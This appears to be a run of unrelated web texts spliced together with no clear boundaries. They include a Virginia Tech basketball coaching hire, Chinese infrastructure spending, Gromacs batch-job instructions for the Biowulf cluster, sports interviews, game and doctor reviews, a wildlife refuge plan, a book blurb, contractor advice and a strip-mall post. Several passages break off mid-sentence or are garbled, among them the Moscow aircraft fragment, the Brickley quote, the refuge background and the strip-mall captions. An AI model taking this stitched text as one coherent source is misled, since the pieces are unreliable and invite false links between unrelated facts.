I hope that we aren't right about what comes next.When he left Virginia Tech three weeks ago to take an assistant coaching job at Clemson, James Johnson said his goal was to turn that into a head coaching job.
He had no idea he would get that opportunity so fast.
Johnson was introduced Tuesday as Virginia Tech’s men’s basketball coach. He replaces Seth Greenberg, the man he worked for as an assistant the past five seasons.
“I don’t think there was any better person for the job than myself,” Johnson said. “I know this university, I know these players. I’ve recruited every one of these guys in some respective and we have everything in place to take this program to the next level.”
The biggest difference, he said, will be his role in the process.
“I go from now being a suggestion-maker to being a decision-maker,” he said.
For athletic director Jim Weaver, who said in dismissing Greenberg on April 23 that the decision wasn’t based on wins and losses, the choice of the 40-year-old Johnson made sense on several levels, including the opportunity to maintain some continuity in the program.
“I believe that you hire the right person at the moment in time,” Weaver said.
Several players talked of possibly transferring after Greenberg was ousted, and they also recommended in a meeting with Weaver that the school give Johnson a chance.
“We considered very strongly their opinions,” Weaver said of the meeting last Monday, which came just after Greenberg was fired. “In order to play, you need players.”
And the players already in the fold really like their new coach.
“We just have a lot of faith in him. He’s coached a couple of times in practice and we really liked what he did, the methods he did, some of the styles he did,” said Erick Green, the top returning scorer, who was waiting to see who was hired before deciding to return.
“We haven’t been this excited in a long time,” Green said.
Forward Jarell Eddie attended the press conference with Green.
“Being able to bring someone in that everyone’s comfortable with, as well as keep everyone here ... it makes the transition smoother,” the rising junior said.
“We want to play for coach Johnson.”
Johnson, an assistant for 19 years, is a native of Powhatan in suburban Richmond who played in college at Ferrum, where he joked got his only head coaching experience.
In a game at Maryville, he said, then-head coach Bill Pullen was kicked out of the game early in the second half with his team down by 20 points. Johnson, an assistant, took over and Ferrum came all the way back to force overtime, but then lost in the extra period.
“So I do have some head coaching experience,” Johnson said, laughing.
Weaver said he consulted with several friends in the coaching business, and they all told him to go with his gut. He said he had no concerns about giving Johnson his first opportunity in the Atlantic Coast Conference, one of the top leagues in the country.
“He’s earned his stripes and it’s time that he became a head coach,” Weaver said, adding later that “every head coach got a break at some point or another.”
Johnson also has coached at Longwood, Old Dominion, Elon, College of Charleston and Penn State, and was at George Mason when the Patriots went to the 2006 Final Four.
Johnson, whose departure for Clemson was part of an exodus that had seen six assistants leave in four years, will be paid $680,000, and will benefit from a policy Weaver got approved when the Hokies were trying to keep him. Virginia Tech will pay its assistants the same money that Clemson pays its assistants, a total of approximately $475,000.
Johnson said he plans to get to work building a staff on Wednesday.Spending on roads, bridges, subways and airports will boom as investments in industrial facilities will worsen overcapacity and more property investments are discouraged by Beijing, Zhang said.
Fan Jianping, a researcher with the State Information Centre, was quoted as saying infrastructure investment would become the focus for Beijing in the second quarter to keep the economy from cooling too much.
China's National Development and Reform Commission has speeded up its approval process for local infrastructure projects, the newspaper reported.
The Ministry of Finance has accelerated fiscal spending. In March alone, fiscal expenditures jumped 34.7 percent from a year ago to 1.02 trillion yuan, exceeding the month's revenues of 905.8 billion yuan.
Zhou Xiaochuan, the People's Bank of China governor, said in a statement at the weekend China would try to maintain "robust, sustainable and balanced growth".
The investment association's Zhang said the central bank has to cut the required reserve ratio by another 5.5 percentage points to keep sufficient liquidity for investment and economic activities.
"A level of 15 percent of (required reserve ratio) will be ideal," Zhang said. The level is currently at 20.5 percent for major lenders.

#!/bin/bash #PBS -N myjob #PBS -m be module load gromacs/4.5.5/plumed2.0.2-mpi-ib `which mpirun` -machinefile $PBS_NODEFILE -n $np `which mdrun` >> outfile 2>&1
qsub -v np=32 -l nodes=4:ib myscript
To run on Gige or Ipath, use the appropriate module as in the chart on the top of this page. Check the number of cores per node for the node type you plan to use, and set np in the qsub command appropriately.
See the Gromacs on GPU page.
In Dec 2014, the Biowulf cluster will implement walltime limits for IB jobs. (Type 'batchlim' to see the current walltime limit). Since there are a limited number of IB nodes and heavy demand, this change is intended to increase turnover of jobs on those nodes. #PBS -j oe # this file is called Run.ib module load use.own module load gromacs/4.6.1/ib cd /path/to/my/dir grompp -f grompp.mdp -c conf.gro -p topol.top -o topol.tpr `which mpirun` -machinefile $PBS_NODEFILE -n $np `which mdrun_mpi` -s topol.tpr # qsub -v np=$np,nodes=$nodes -l nodes=$nodes:ib Run.ib
This script would be submitted with:
biowulf% qsub -v np=16,nodes=2 -l nodes=2:ib Run.ibto run a series of jobs on 2 IB nodes.

Details about running replica exchange with Gromacs are on the Gromacs website. Multiple tpr files need to be generated from multiple *.mdp files with different temperatures. Below is a sample script for generating the tpr files. (courtesy Jeetain Mittal, NIDDK)
#!/bin/csh -f set ff = $argv[1] set s = $argv[2] set proot = 2f4k #set ff = amber03d set i = 0 while ( $i < 40 ) set fileroot = "${proot}_${ff}" set this = "trexr" if ( $s == 1 ) then set mdp = "mdp/trex_ini${i}.mdp" set gro = "unfolded.gro" else set sprev = $s @ sprev-- set mdp = "mdp/trex_cont${i}.mdp" set gro = "data/gro/${fileroot}_${this}_s${sprev}_nd${i}.gro" endif # 40 rep grompp -v -f $mdp -c $gro \ -o data/tpr/${fileroot}_${this}_nd${i}.tpr \ -p ${fileroot}_ions.top @ i++ end
Gromacs 4.0 can run with each replica on multiple processors. It is most efficient to run each replica on a dual-core node using all the processors on that node. This requires creating a specialized list of processors with the command make-gromacs-nodefile-dc (which is in /usr/local/bin) as in the sample script below.
#!/bin/bash # this file is Run_Gromacs_RE #PBS -N Gromacs_RE #PBS -k oe #PBS -m be # set up PATH for gige or ib nodes export PATH=/usr/local/openmpi/bin:/usr/local/gromacs/bin:$PATH cd /data/user/my_gromacs_dir #create the specialized list of processors for RE make-gromacs-nodefile-dc /usr/local/openmpi/bin/mpirun -machinefile ~/gromacs_nodefile.$PBS_JOBID \ -np $np /usr/local/gromacs/bin/mdrun \ -multi $n -replex 2000 >> outfile 2>&1
Submit this script to the dual-core nodes with:
qsub -v np=128,n=32 -l nodes=32:dc Run_Gromacs_RE
The above command will submit the job to 32 dual-core (either o2800 or o2600) nodes. Each of the 32 replicas will run on all 4 processors of each node. The number of processors (np=128) and the number of nodes (n=32) is passed to the program via the -v flag in qsub.
It is critical to determine the appropriate number of nodes on which to run your job. As shown in the benchmarks below, different jobs scale differently. Thus, one job which scales very well could be submitted on up to 10 nodes, while another job may scale only up to 2 nodes. For some jobs, if you submit to more nodes than is optimal, your job will actually run slower.
To determine the optimal number of nodes:
- Set up a small version of your job. e.g. if your project involves a simulation of 100 ps, set up a 1ps job.
- Submit this job to 2 processors (1 node), 4processors (2 nodes), 6 processors (3 nodes) ...
- Examine the results. You want to pick the number of processors with at least 70% efficiency.
100 * Time on 1 processor --------------------------- = Efficiency n * Time on n processors
Biowulf job monitors..
- jobload. The jobload command will report the loads on the nodes allocated to your jobs.
biowulf% jobload userA Jobs for userA Node Load 1708520.biobos p289 75% p293 74% p297 90% p298 67% Job Average: 76% 1952867.biobos p308 71% p363 70% p369 69% p377 86% Job Average: 74% User Average: 75%
- The PBS batch system will write 2 files called JOBNAME.oJOBNUM and JOBNAME.eJOBNUM in your home directory (e.g. GROMACS.o90763 and GROMACS.e90763). They contain the standard output and standard error from your job. Most problems can be figured out by examining these files.
Summary:
- Different Gromacs jobs scale differently; it is important to run your own benchmarks to determine the optimal number of nodes for your particular job.
- Gromacs scales best on the QDR Infiniband nodes. Based on the d.dppc benchmark results below, one could submit this job with reasonable efficiency to:
- 128 QDR IB cores (8 QDR IB nodes) using 16 cores on each node.
- 64 DDR IB cores (8 DDR IB nodes) using all 8 cores on each node.
- 2 x2800 nodes using 12 cores on each node.

This section is for users who may or may not be familiar with Gromacs, but would find it helpful to go through the process of running a simple Gromacs job on Biowulf. The example below runs a Gromacs MPI job on Infiniband.
There is a test set of data (part of the Gromacs benchmark suite) in /usr/local/apps/gromacs/d.dppc. The screen trace below shows how an interactive node is allocated, the test data copied, and 'grompp' and 'mdrun' are run. User input is in bold. The job is later rerun using a batch script.

It was meant as a playful jab. It was also a dose of reality.Just days after Notre Dame's 41-14 Sugar Bowl defeat, Kerry Neal attended an awards banquet for the East Meets West All-American Game in Orlando, Fla. As the defensive end was announced, the event's host joked that the Irish defense needed the 6-foot-3, 235-pound defensive end right then and there. He might have been right.With the Irish losing both starting defensive ends (never mind Ronald Talley, who left in mid-season), there's a chance for Neal to arrive in South Bend with a fighting chance for playing time. Neal hopes another 5-to-10 pounds will let him win that battle. And as much as he watched the Sugar Bowl from afar, the standout from Bunn, N.C. felt like he was in New Orleans with his future team.Neal received a visit from Notre Dame defensive backs coach Bill Lewis on Jan. 16, a date that included a stop in Durham, N.C., by the Irish assistant. ...More...

About Vasco Torres
VASCO TORRES Vasco Torres studied aesthetics and contemporary arts at the Calouste Gulbenkian Foundation, Cultural Center of BelÃ©m and National Society of Fine Arts in Lisbon, Portugal. He undertook several theorical and intensive courses with respected teachers such as Margarida Calado and Cristina Azevedo Tavares of the Fine Arts University in Lisbon. In 1999 he had the opportunity of participating in several painting sessions with the remarkable master and painter AntÃ³nio Inverno. Vasco Torres was graduated from the advanced course of Contemporary Art History at the Catholic University of Oporto where he was a finalist of the master course in the same area. At the Fine Arts University of Lisbon, he attended a course of water markings and water ink, tutored by the teacher Joana Latka. He exposed his paintings in several collective and individual exhibitions around Portugal since eighties. He is also represented in art publications including books edited by Ernesto Neves of First Gallery in Lisbon or by the editor Fernando Infante do Carmo or the art critic and antiquary lover Jean Pierre Blanchon. Torres has international representation of is works in several countries like, United Kindom, Canada, United States, Switzerland, France,Deutcheland and Spain. I am painting since eighties and i like very much the New York School and also the matheric artists and action painters. My works are figurative and abstract ones.IÂ´m a self taught artist whose paintings stile is a free gestual impulse. The painters i prefer are for instance: Franz Kline, Manolo Valdez, Alberto Burri, Jean Miotte,Jean Paul Riopelle,Pierre Soulages, Lita cabellut, Kenneth Loines, Banksy, and the scratching walls artists like the portugueese whils.

Introduction ↑
With this notice, we announce the completion of the CCP process for Columbia NWR. We started this process through a notice in the Federal Register(74 FR 25576; May 28, 2009). We released the draft CCP/EA to the public, announcing and requesting comments in a notice of availability in the Federal Register(76 FR 45600; July 29, 2011).
We announce our CCP decision and the availability of a FONSI for Columbia the EA that accompanied the draft CCP.
The CCP will guide us in managing and administering Columbia NWR for the next 15 years. The selected alternative, as described in the final CCP, is a combination of actions from alternatives 2 and 3 in the draft CCP and is the basis for management direction.
Background ↑
The, and environmental education and interpretation. We will review and update the CCP at least every 15 years in accordance with the Refuge Administration Act.
We solicited comments on the draft CCP/EA for the refuge from July 29, 2011, to August 29, 2011 (76 FR 45600). All letters and comments received were thoroughly evaluated and considered in the selection of a final alternative. The only change to the alternatives in the draft CCP was modifying the overnight closure of Morgan Lake Road to allow for access starting 11/2hours before legal hunting time and ending 11/2hours after legal hunting time during State hunting seasons.
Selected Alternative ↑
All actions in the selected alternative are subject to available funding and any other compliance requirements. Under the selected alternative, refuge management will continue much as is, consistent with available funding and staffing, except that 175 acres of emergent marsh wetlands in Marsh Unit III will be converted to riparian habitat, with other wetlands to potentially follow based on the success of the first conversion. The Crab Creek channel will be restored, and stream restoration will be a priority to provide for steelhead and redband trout and improve riparian areas for migrating neotropical birds. Specialized habitats (e.g., rock outcroppings) will receive more planned attention. Grasslands will be maintained to provide for species like the long-billed curlew, and cooperative farming agreements will continue to provide green forage and grains for geese, waterfowl, and Sandhill cranes, while emphasizing low-impact techniques. Habitats will be maintained and protected for loggerhead shrikes, sagebrush lizards, and a variety of raptors. Management of State and Federal species of concern will be emphasized. Refuge lands will continue to be managed using a mix of natural processes and substantial management intervention. For example, many wetland areas are allowed to follow natural succession—although noxious weed control, prescribed fire, and other maintenance actions are undertaken—but several moist soil management areas require water level manipulation, dike maintenance, extensive soil preparation, planting, and other treatments. Land transfers will be pursued to provide continuous blocks of habitats and simplify management.
Public use will be a blend of active and passive. Horseback riding and bicycling will continue, but camping will be eliminated. The Soda Lake Campground will be converted to day-use facilities, and the area around the Bluebird Campground will be available by permit for day use as an educational site. Morgan Lake Road will be closed to overnight travel. Facilities with increased accessibility will be developed to promote compatible hunting and fishing. Waterfowl and big game hunting opportunities will be expanded by opening new areas; providing for additional hunting weapons; and implementing additional youth hunt days, areas, and seasons. The waterfowl hunting lottery will be discontinued in favor of first-come, first-served hunting. A new hiking and interpretive trail will be developed within the Drumheller Channel National Natural Landmark in cooperation with the National Park Service. Seasonal and permanent wildlife observation blinds will be provided. New interpretive and educational programs and brochures will be developed, with an emphasis on building the volunteer program to manage them. The Sandhill Crane Festival will remain a priority. Fish stocking by the Washington Department of Fish and Wildlife will continue, with an approved fisheries management plan, but will be discontinued in lakes where there is the highest likelihood of success for northern leopard frog recovery.
Step-down plans on informational and interpretive signs, cultural resource management, habitat management, and other management areas related to the goals and objectives in this CCP will be developed. Water rights and/or agreements will be pursued to ensure the availability of water for moist soil management.

Thank you for visiting.If the toilets were cleaned the morning of the day we left, and it is clean water in the bowl, where does the ring come from that appears in a mere six days? Come on....if a ring is going to mysteriously appear, wouldn't you prefer it to look like one of these?
These rings are all from Tiffany's online should anyone care to shop today. The blue sapphire goes for $105,000, the diamond in platinum band is $13,900, the tourmaline and diamond ring is $6,550 and the sweet little bow is a mere $1,500. Now I ask you, aren't these a much nicer welcome home surprise than a toilet ring?
Another mystery is where does dust come from? I can almost understand (but not forgive!) dust from arriving during the heating months because there may be a few errant dust motes in the heating ducts. Did I just say "a few"? There are probably armies living in there but were coexist fairly well. I don't attack them until they attempt to take over my space. This is not to be confused with Myspace....I don't have a page there. Dust motes, bunnies and cobwebs are welcome to go there any day of the week.
Do I dare bring up spiders in this conversation? We pay, yes PAY, to have the exterior of the house and cottage sprayed to ward off spiders. It works well at home. At the cottage, I think it only makes them laugh. Sure, it keeps out the weeker spiders with allergies, but the hardy ones? They reappear within days, usually in the bathroom. If I don't put my glasses on in the middle of the night, I usually don't see them, but I have heard them try to choke back laughter as they view my....never mind....use your imagination or not.
And lastly, speaking or not of certain anatomical parts, where do fat cells come from? I mean really. If I am on vacation, isn't it my constitutional right to eat BLTs heavy on the B? And a few chocolate miniature bars? They would have melted if we left them closed up in the cottage! And the quarter pounder with cheese meal on the way home? That can't count! I was starving and I knew there wasn't any food left at home. Besides, I gave all the fries that feel out of the holder into the bag to my husband. Surely those were the ones with all the calories, right?
Bad Ronald! Bad, bad Ronald!

Tampa Mayor Bob Buckhorn on a Coast bike.
Coast Bike Share, the city-sanctioned program that’s part of Mayor Bob Buckhorn’s plan to create a more livable downtown, will start accepting memberships on July 7, and should be fully operational by mid- to late-August.
The program was originally supposed to launch in the spring, but was delayed so that the special bikes could be outfitted with the latest computers with an enhanced user interface, said Program Director Eric Trull.
The bike-sharing program, which will start with 300 bicycles and 30 kiosks in and around downtown, emerges at a time when transportation is a hot-button issue for the entire region. A key facet is known as “first-mile/last-mile,” which addresses how mass transit customers get to and from bus or train stops. Bike sharing is seen as one of the most viable means available.
Coast Bike Share will be open to spot users — even those without smartphones — as well as regular members, who can pay a fee for daily, monthly or annual use.
The for-profit company, with an office in Ybor City and three local employees, is a joint venture between Miami-based Cycle Hop, the manufacturer, and New York-based Social Bikes, the programmer/operator. Coast Bike Share won a contract from the city in March 2013. No money changes hands in the arrangement, but the city is providing right-of-way on city sidewalks for kiosks. They will resemble regular bike racks, not require a large footprint and be easily movable.
“Most bike-share programs use smart locations and dumb bikes,” Trull said. “We use smart bikes and dumb locations.”
Trull said the program is trying to tie in with the HART and PSTA transit systems in Hillsborough and Pinellas counties. Coastal doesn’t plan to paint the community with billboards and other advertising, but use an organic growth model that partners with local businesses. And each kiosk will in effect be its own ad exposed to high traffic. “We want to be a tasteful addition to the city,” Trull said.
A revenue stream will come via promotional messages on the bikes’ smartphone-sized computers. Trull gave an example: “A user locks their bike in front of Kahwa Coffee and gets a buy-one-get-one message.”
Tampa will have to endure a few more weeks of dog days before getting its bike-share option, but in the meantime keep a lookout for blue signs that say “Bike Station Coming Soon!”MOSCOW: R., Russia’s newest frontline bomber Su-34, and Mi-8, Mi-24 and Mi-28N helicopters would be used in the exercises and the aircraft would conduct missile practice.”, he was quoted as saying.

Andy Brickley on D&C: David Krejci ‘hasn’t been good enough’
Posted By Max Tedford On February 8, 2012 @ 11:18 am In General | No Comments
NESN Bruins analyst Andy Brickley made his weekly appearance on Dennis & Callahan Wednesday morning and talked about David Krecji being dropped to the third line, the evolution of Patrice Bergeron [1], and the tough road ahead for the Bruins.
Krecji, who usually plays on the first line with Milan Lucic [2] and Nathan Horton [3], saw his role changed when he was put on the third line. Brickley looked at the move as Bruins coach Claude Julien [4] [5]. ….”
Following are more highlights from the conversation. To hear the interview, go to the Dennis & Callahan audio on demand page [6].
More on Krecji and his consistency issue: “When you want to be regarded as a top player in this league, a top player salary-wise on your team, as far as your salary structure is concerned, what you want to be perceived as across the league, you want to live up to the reputation that you helped build during last year’s playoffs, then you have to do it on a more consistent [basis], night in and night out, no matter how much of a lead we have in our division, no matter how secure we are in the playoff standings.”
On Bergeron having his best season: “Absolutely, and I really don’t even care what the numbers tell you. The eyeball test tells you just how good he is and how much he means to this team, how good he’s been in all three zones, his attitude, his role model status. This kid gets it, he’s gotten it since he was 18 years old. He came in as a second-rounder and made the team right out of his first camp.”
On the Bruins’ upcoming road trip and the trade deadline: “At the end of this month they have an 11-day road trip, they’re going to play a bunch of teams that are bubble teams, Buffalo being one of them. We’re getting into that area now, that final month here before the trade deadline, if the Bruins are going to make additions, [they] would like to make it during that road trip to get the new players acclimated to their team. But there’s so many teams that are on the bubble, who do you target as a team that’s willing to make deals? Right now you only have six teams that are out of the playoff structure.”

Rated 3.5 / 5 stars
a bit fun, the linear path was kinda boring, all it takes is a death or two to find out what zombies are waiting. The Western music thing was a nice touch, made it feel like a shoot-out though, which it basically was, I mean don't bother with the other guns, just focus on pistol and armor/health and the game is a synch. I don't understand why the ammo amount was shown on the upgrade screen, I mean none of the guns got their ammo increased through leveling, also you should have the last thing in level up screen for different guns just shows how much total ammo you can have for the gun, honestly I felt the lmg was underkill for overpriced amount, by the time I even had enough for it my pistol was doing around 300 damage per shot, and was much easier to upgrade. I can understand the damage increase between different zombies, but that generally doesn't matter when you kill them before they get close enough to touch you, even the knife throwers weren't a problem. The level progression didn't seem very consistent, I mean you start out on an office level, two levels lower or higher and suddenly you are in a storage area or basement. I do like how between long drawn out floor areas, there is the area that was just a large field of enemies that you had to mow down. Also I found it easier to switch to a different weapon instead of waiting for the reload once you emptied a clip, because once you swapped back the weapon was ready to fire again almost immediately without a reload animation, not that the reload animation was very interesting in the first place. And I totally understand putting the armor damage reduction cap at 50%, a very reasonable amount of armor, how ever without bothering very much with the health upgrade it seemed like it would make one too strong when paired with the damage reduction, thus leading to the ease of playing, but also the boredom of repetitive task of mowing down all enemies in your way. So I give it 3.5 stars, good concept, although a lot like many others in this category, even with the enemies being classified as zombies. In the end it comes down to how to make it different while remaining in the said genre and type of game.

Its okay, i mean you could do really better just put a LITTLE bit effort in it the hand looks like from a Stickman , The weapons dont have any animation, The music don't fit the fighting scenes and stops before the fight is over ,The weapons upgrade system is fucking Broken (i mean it would be better if you can choose between : more ammo, more damage , faster Attacks speed us but you give ever thing to us : More ammo, More Damage , Faster reloading and a higher fire rate so you can just upgrade your normal Handgun and its the most overpowered weapon, why bother buying a uzi? And that you just Ripped off the Zombies from L4D and in higher level just recoloring them is quite a lazy ass move from you. Also some thing that came unexpedenly like you have to suddenly turn around and fight aginst someone would be nice.
My Problem : THIS IS JUST SUCH A FUCKING NICE SYSTEM only the implementation is fucked up
Rated 3 / 5 stars
Not too bad. Started out a bit lame, but after collecting some weapons and encountering more enemies it was at least fun. Lots of potential though for more interesting enemies and weapons... and the final boss was annoying in that I had to be defeated about five times in order to collect enough money to upgrade my best weapon to the level it could kill him fast enough... (sorry for the long sentence). Didn't like those "monster runs" in general, going through corridors and doors and encountering them is definitely more interesting even if the path is not under my control.Blue Orchid Cleaners
Partner Spotlight
When Jenny Svetcos opened the Blue Orchid Dry Cleaners in Rosslyn in 2010, she was no stranger to the dry cleaning business. Over thirty years ago, Jenny and her family moved to New York City where they purchased an existing dry cleaning business. Her family had recently emigrated from Korea, and her father asked her to take a break from college in order to manage the new store. Jenny's father promised she could return to school after she ran the business for two years, but she became so good at taking care of customers that she never returned to complete her degree. Over the years Jenny taught her younger brother and sister the dry cleaning business; Jenny's brother now manages the family store while her sister has her own store in Brooklyn.
Before Jenny opened the Blue Orchid, she owned Rosslyn Metro Dry Cleaners for over 10 years. "I love being in Arlington," says Jenny. "I like the people, and the activities-everything is so close by." Having a business that is Metro accessible is important to Jenny, "We are about the same distance between the Court House and Rosslyn Metro stops, and many of our customers come from the Metro and stop in on their way to work." Jenny's customers take advantage of her same day service, allowing them to drop off their clothes on the way to work and pick them up on the way home.
Jenny has developed a loyal customer following and it's easy to see why her business has grown, primarily through word-of-mouth. Jenny says, "My customers tell me that they will follow me wherever I set up my store." Jenny's customers are more than just 'customers.' She even invited several of them to her wedding several years ago. She has a large clientele of diplomats, military officers, and local celebrities who travel from as far away as Winchester, VA and Maryland to have Jenny take care of their clothes. She uses environmentally friendly, petroleum-free chemicals in her dry cleaning process and offers expert tailoring and alterations. She also repairs shoes and preserves wedding gowns.
Jenny has many stories about her customers, and she is very proud of the trust that they have in her. Jenny tells us "Many of my customers forget to check their pockets when leaving their clothes. Over the years, I have found many things including money, lipstick, and even ID badges. I always take care of my customers and they know I will do the best job for them."
When Jenny decided to open her store at its current location, 1747 Clarendon Blvd., she knew exactly what she wanted it to look like. An avid orchid enthusiast, Jenny designed the store with pleasing colors, right down to the blue orchid plant that is on display near the entrance. She even has doggie biscuits for her customers' dogs. When asked for advice to keep clothes in good condition, Jenny replied, "Don't wait to bring in your clothes after they have been stained. The fresher the stain, the better results." Sage advice from a woman who has been taking care of clothes for over a quarter of a century.

Giroud: Arsenal never panicked in European pursuit
Olivier Giroud has noted that Arsenal "never panicked" in their bid to clinch a Champions League qualifying spot this season.
Trailing neighbours Tottenham Hotspur by seven points after losing the North London derby in March, Arsenal reeled off eight wins in a ten-game unbeaten charge to finish the season in fourth, one place ahead of Spurs.
Giroud, 26, said the squad followed Arsene Wenger's example and kept cool to the end.
"You felt the squad never panicked," Giroud told RMC. "Just like the coach, who is naturally reassuring, we stayed calm. We know our qualities, and we were never too far off the Champions League qualifying places. There was nothing alarming. The fixture list was good to us, and we put together a good run."
It was fellow Frenchman Laurent Koscielny, 27, who scored Sunday's crucial goal in the 1-0 victory at Newcastle United to keep the Gunners ahead of Spurs, but in his maiden Premier League campaign, Giroud is satisfied with his contribution to the cause.
"In terms of numbers, it's good for a first season in England," last summer's signing from Montpellier, who struck 17 goals and notched ten assists in 47 games in all competitions, said. "The Premier League isn't necessarily easy to adapt to."
Giroud had already drawn comparison with Didier Drogba and Thierry Henry's debut seasons in England, and he added: "If I'm not mistaken, Drogba scored 17 in his debut season with Chelsea and Henry 16 with Arsenal. I can still improve, but it augurs well for the future. I feel good at Arsenal."
The outlook was somewhat bleaker though when Giroud went without a goal in the first six games of the Premier League season.
Having arrived as the French top-flight's top scorer in Montpellier's title-winning season, expectations were high, but the France international praised Wenger, 63, for not adding to the pressure.
"Arsenal are a well-oiled machine. When you arrive, you have to fit in. I settled in well. The coach gave me time. I had some little times which were less good at the start of the season. I waited a long time for that first goal, but I stayed focused and didn't pay any attention to the critics."

Dr. Madland is my current doc as I am 32 weeks pregnant with my 2nd and wish we weren't moving as I would love to keep him as my doc for delivery. He is very kind and respectful and takes the time to listen to any questions or concerns. He is willing to allow women to try for a VBAC and that alone means the world to me! I would recommend him to anyone in the area looking for a new OB/GYN. Best one I've ever had and never rushes me through appointments!

Dr. Madland is by far the best OB/GYN I have ever had. He takes plenty of time with you during your appointments and treats you with the utmost respect. He personally helped me with infertility issues when it would have been easier to send me onto a specialist. He took the time and energy into working with myself and my husband and his dedication to us will never be forgotten!

Florence and the Plot against the Medici
On a Sunday in April 1478, assassins attacked Lorenzo and his brother as they attended Mass in the cathedral of Florence. Lorenzo scrambled to safety as Giuliano bled to death on the cathedral floor. April Blood moves outward in time and space from that murderous event, unfolding a story of tangled passions, ambition, treachery, and revenge. The conspiracy was led by one of the city's most noble clans, the Pazzi, financiers who feared and resented the Medici's swaggering new role as political bosses--but the web of intrigue spread through all of Italy. Bankers, mercenaries, the Duke of Urbino, the King of Naples, and Pope Sixtus IV entered secretly into the plot. Florence was plunged into a peninsular war, and Lorenzo was soon fighting for his own and his family's survival.
The failed assassination doomed the Pazzi. Medici revenge was swift and brutal--plotters were hanged or beheaded, innocents were hacked to pieces, and bodies were put out to dangle from the windows of the government palace. All remaining members of the larger Pazzi clan were forced to change their surname, and every public sign or symbol of the family was expunged or destroyed.
April Blood offers us a fresh portrait of Renaissance Florence, where dazzling artistic achievements went side by side with violence, craft, and bare-knuckle politics. At the center of the canvas is the figure of Lorenzo the Magnificent--poet, statesman, connoisseur, patron of the arts, and ruthless "boss of bosses." This extraordinarily vivid account of a turning point in the Italian Renaissance is bound to become a lasting work of history.less

Unless specified, a contractor isn’t obliged to have anything more to do with your job than to sign the contract, take a deposit and wish you well. And, of course, make sure that somebody does the job in accordance with the specific provisions of the contract (your contract had lots of specifics, right? like assuring the contractor would call you, talk to you, tell you everything was O.K. and they have enjoyed the time they shared with you). It’s a cruel world out there, and then, your health care gets voted on by congress. Time to wake up and smell the sawdust.
Now, don’t get me wrong. I’m not saying that contract law allows contractors to defraud the public and vacate promises of work. It does not, but it says very little about who you have actually hired. Ask around, and you will find more than a few folks who, having hired a given contractor, often because of their trust in that particular person, later found themselves working with a gang of subordinates who cast a sorry or limp shadow of the absent hero.
So, it’s a good idea, when you sit down with the contractor you’re hoping to work with to ask whether they will be doing the work. Often, the answer will be that they will be checking on the work from time to time, but they won’t actually be swinging a hammer. If you never ask, you might never know until the work is well under way.
One can specify in a contract that one wishes the contractor to be on-site and perform certain services (within some reasonable bounds, indentured servitude now being largely outlawed), but this is a very slippery slope, and I would argue that it’s always better to start off by hiring someone to do things the way that they are accustomed to doing them. Then the marriage has a chance.
Many small contractors (2–5 person firms) will be on-site much of the time anyway, and if you’re looking for that boutique experience, you might want to stay with a highly ranked person in a company of roughly that size. Once a contractor has more than, say, 6 or 7 persons on staff, nobody is going to see them all that much of the time, since the lion’s share of their energies will be going into keeping all those other people productive, efficient and paid.
As contractors, our lives and days change as we evolve into business-folk. We change hats and clothing, manners and venues. Many don’t make the switch. Some back up, drop down to handyman status or leave entirely. Some find the upward-mobility a natural ride. It varies with each contractor and each has their own gifts and curses.
Discerning these attributes should be the mission of the consumer. Shopping for contractors is like figuring out what kind of suit you’re looking for (or overall, or ripped tee). Will they be on-site? Will they supervise well? Will I get a good deal? Will the work be to my liking? Will I enjoy the experience and feel taken care of? These needs will vary with the buyer (yes, you will bring much to this table) and the contractor. Small can be very intimate and make a lot of room for positive change and adaptation, even though it can be slower. Larger firms are often quicker and can usually tackle tougher problems. They may also have plusses that a small one does not, such as a connection with an engineer or architect.
There is no one model for everyone, but there is one element in this equation that is worth asking and learning about and that is the job-site foreman or superintendent.
These mini-contractors are both employee and boss. They are liaison and worker. Often, they are a job boss (telling everyone else what to do) and organizer, but above all, they are yours. These sergeants in the field of contracting hold sufficient rank to do all the things your absent contractor cannot, and, often as not, will do better carpentry and clean up than the boss.
Now just as contractors vary, a foreman comes in a variety of shapes and sizes. Meeting a proposed foreman during the shopping phase is an awfully good idea. If there are several foremen (these can, of course, be women) then meet them all, just in case there’s a switch. It is quite common, in my experience for these persons to be quite similar in a given company since they will reflect the predelictions of the boss (ever meet two or three ex-husbands of the same woman?).
The job foreman is empowered to make a range of decisions, but this will have its limits. They may have to consult with the general contractor or wait for a call back on some issues, but this is a finer point. The take-home message here is that if you have a foreman dedicated to your job and you like them, you will often be happier than the person who has the contractor on-site every day. The politics of this are sort of like good-cop, bad cop. There is face-saving too. The foreman “feels” like they belong to you when they’re on your site and they can “seem” to go to bat against the contractor to get you more of this or less of that because they have an investment in you and the outcome of “their” job. It’s very much like organizational politics and you’re the winner if you have a stalwart foreman that you like and with whom you have a good working relationship.
If you are thinking of working with a mid-sized contractor who does not use a foreman or superintendent system, think again. This is often a sign that the contractor has either not matured organizationally, or is just cheap (which is also foolish). For contractors, spending enough to keep people happy is smart business, and no successful contractor can last long with a string of unhappy clients dragging behind them. The ones that shine, are those who spend enough to keep the jobs moving along at an appropriate pace and keep good replicas of themselves on-site to create, solve and please.Almost everyone here has seen the telltale strip mall that has seen better days. We usually surmise that one of two factors has impelled the tenants to flee a shopping center or other commercial district: either the demographics in the area have changed (usually becoming lower income), or a newer, shinier shopping center has opened up within close proximity. The photos below are scarcely groundbreaking, because what we have here is a strip mall that has clearly reached the end of its marketable life.
Here’s the most prosperous looking corner, but looks can be deceiving, because its vacancy rate is still 100 percent. And here is a crude panorama of the entire sprawling strip of stores, with its clear anchor on the far right:
Anyone with an eye for logos or big-box architecture can recognize the anchor building as a former WalMart; the company has a vibrant history of abandoning these buildings, only to move to a brand new, bigger structure less than a mile away.
To the far left of this panorama is a smaller strip, built perpendicularly to the aforementioned. It clearly isn’t faring any better.
And in between the older and the newer WalMart? Another struggling strip mall, where the anchor,
, still seems to be functioning well, but all the in-line tenants are struggling. Here’s the scene immediately to the west of the previous photos. Value City
The
(which I unfortunately failed to photograph) is to the left of this second photo. And, if we venture further to the west, we get a booming new WalMart and generally prosperous retail leading to the old town center (which also could use some help). Value City
Aside from the severity of the blight here, is there anything else that makes these shopping centers distinct? For one thing, it doesn’t take place in an inner-ring suburb; sadly, this is precisely what you might expect to see in parts of
. But these pictures come from Indianapolis , one of Plainfield, Indiana ’ surging suburbs and part of one of the fastest growing counties in the country. If you look at the distance of this picture, in between the old WalMart and a row of smaller, in-line stores to its left, you can see what most likely drove all the retail out: Indianapolis
